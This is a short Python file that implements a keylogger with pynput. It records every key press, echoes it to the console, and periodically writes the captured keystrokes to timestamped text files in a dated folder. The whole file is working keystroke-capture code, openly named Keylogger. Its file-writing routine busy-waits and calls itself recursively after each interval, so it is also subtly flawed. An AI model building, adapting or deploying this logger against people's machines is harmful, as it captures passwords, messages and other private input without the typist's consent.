from pynput.keyboard import Key, Listener
from Time import to_day
from datetime import datetime,timedelta
import os
# from threading import Thread
    
keys = []

def write_to_file(seconds):
    sta_time = datetime.now()
    end_time = datetime.now() + timedelta(seconds=seconds)

    file_name = sta_time.strftime('%Y_%m_%d-%H_%M') + "T" +  end_time.strftime('%Y_%m_%d-%H_%M')
    while True:
        if datetime.now() >= end_time:
            path = to_day() + "/key_logger"
            if not os.path.exists(path):
                os.makedirs(path)
            path += "/" + file_name + ".txt"

            with open(path, 'w', encoding='utf8') as f:
                for key in keys:
                    f.write(key)
            keys.clear()
            write_to_file(seconds)

def on_press(key):
    if key == Key.space:
        key = " "
    elif key == Key.enter:
        key = "[ENTER]\n"
    keys.append(str(key))
    print(f"{key} pressed")

def Keylogger():
    Listener(on_press=on_press).start()

# if __name__ == "__main__":
#     Keylogger()
#     Thread(target=write_to_file, args=(60, ), daemon=True).start()
#     while True:
#         pass
